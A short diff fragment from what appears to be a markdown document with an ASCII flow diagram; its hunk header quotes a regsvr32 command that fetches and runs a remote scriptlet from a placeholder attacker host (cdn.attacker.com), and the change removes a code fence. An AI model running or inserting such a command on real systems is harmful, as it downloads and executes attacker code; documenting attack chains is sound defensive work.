@@ -336,7 +336,7 @@ regsvr32 /s /n /u /i:https://cdn.attacker.com/stage.sct scrobj.dll
         +------------------------------+
                    |
                    v
-```
+
                    
 
                    
